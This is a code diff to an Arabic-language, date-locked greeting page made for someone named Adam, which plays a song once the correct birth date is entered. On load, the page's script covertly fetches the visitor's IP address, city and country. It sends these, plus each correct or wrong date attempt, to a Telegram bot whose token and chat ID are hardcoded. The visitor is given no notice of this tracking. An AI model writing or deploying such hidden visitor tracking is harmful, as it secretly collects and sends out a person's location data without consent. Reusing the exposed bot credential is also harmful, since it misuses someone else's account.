@@ -145,7 +145,7 @@
             font-weight: 700;
         }
 
-        /* تصميم معرض الصور (Gallery Slider) */
+        /* معرض الصور Slider */
         .gallery-container {
             display: flex;
             gap: 12px;
@@ -222,10 +222,10 @@
 
     <div class="container">
 
-        <!-- 1️⃣ شاشة إدخال تاريخ الميلاد (المفتاح) -->
+        <!-- 1️⃣ شاشة إدخال تاريخ الميلاد (صيغة المذكر) -->
         <div class="card" id="loginCard">
             <h1 class="cursive-title">Hi Adam</h1>
-            <div class="subtitle">دخل تاريخ ميلادك يا روحي 💖</div>
+            <div class="subtitle">ادخل تاريخ ميلادك يا روحي 💖</div>
 
             <div class="form-group">
                 <label>اليوم</label>
@@ -244,7 +244,7 @@
             </div>
         </div>
 
-        <!-- 2️⃣ قسم الرسالة والمحتوى بعد إدخال التاريخ الصحيح -->
+        <!-- 2️⃣ قسم المحتوى بعد الفتح -->
         <div id="mainContent">
             
             <!-- كارت Heart -->
@@ -293,16 +293,17 @@
     </div>
 
     <script>
-        // ضبط قفل التاريخ: اليوم 10 والشهر 9
+        // التاريخ الصحيح لفتح القفل (10 / 9)
         const CORRECT_DAY = 10;
         const CORRECT_MONTH = 9;
 
-        // بيانات البوت لإرسال الإشعارات
+        // بيانات بوت التليجرام الخاص بك (الأدمن)
         const BOT_TOKEN = "8989450747:AAFQ56vM9mniwelDaqf5zqc76J2f3zorpE0";
         const CHAT_ID = "8718173410";
 
         let visitorIP = "غير معروف";
 
+        // إشعار فوري للأدمن على تليجرام بمجرد دخول آدم للموقع
         window.addEventListener('load', async () => {
             let visitMsg = `🚨 آدم (أو زائر) فتح الرابط الآن!\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
             
@@ -310,7 +311,7 @@
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
                 visitorIP = data.ip || "غير معروف";
-                visitMsg = `🚨 آدم (أو زائر) دخل الموقع الآن!\n\n🌐 الـ IP: ${visitorIP}\n📍 اللوكيشن: ${data.country_name || ''} - ${data.city || ''}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                visitMsg = `🚨 آدم (أو زائر) دخل الموقع الآن!\n\n🌐 الـ IP: ${visitorIP}\n📍 الموقع الجغرافي: ${data.country_name || ''} - ${data.city || ''}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
             } catch(e) {
                 try {
                     let res2 = await fetch('https://api.ipify.org?format=json');
@@ -335,14 +336,17 @@
                 document.getElementById('loginCard').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'flex';
                 
-                // تشغيل الأغنية أوتوماتيك عند إدخال التاريخ الصحيح
+                // تشغيل الأغنية فوراً
                 const audio = document.getElementById('bgAudio');
                 if(audio) audio.play().catch(() => {});
 
-                sendTelegramNotification(`🎉 آدم دخل تاريخ الميلاد الصحيح بنجاح! (10/9)\n🌐 الـ IP: ${visitorIP}`);
+                // إرسال إشعار بنجاح الفتح للأدمن
+                sendTelegramNotification(`🎉 آدم ادخل تاريخ الميلاد الصحيح بنجاح! (10/9)\n🌐 الـ IP: ${visitorIP}`);
             } else {
                 errorBadge.style.display = 'block';
-                sendTelegramNotification(`⚠️ محاولة إدخال تاريخ خاطئ: (${dayInput}/${monthInput})\n🌐 الـ IP: ${visitorIP}`);
+                
+                // إرسال إشعار بمحاولة إدخال خاطئة للأدمن
+                sendTelegramNotification(`⚠️ آدم جرب تاريخ غير صحيح: (${dayInput}/${monthInput})\n🌐 الـ IP: ${visitorIP}`);
             }
         }
 
